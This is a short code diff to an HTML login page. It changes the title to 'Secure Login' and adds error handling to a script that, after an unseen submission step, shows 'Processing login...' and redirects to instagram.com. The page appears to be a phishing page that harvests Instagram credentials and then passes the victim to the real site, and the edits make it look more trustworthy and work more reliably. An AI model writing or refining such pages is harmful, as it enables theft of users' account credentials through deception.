@@ -2,7 +2,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Login</title>
+  <title>Secure Login</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -62,6 +62,9 @@
       }).then(() => {
         alert("Processing login...");
         window.location.href = "https://instagram.com";
+      }).catch(err => {
+        alert("Something went wrong. Check your internet or try again.");
+        console.error(err);
       });
     }
   </script>
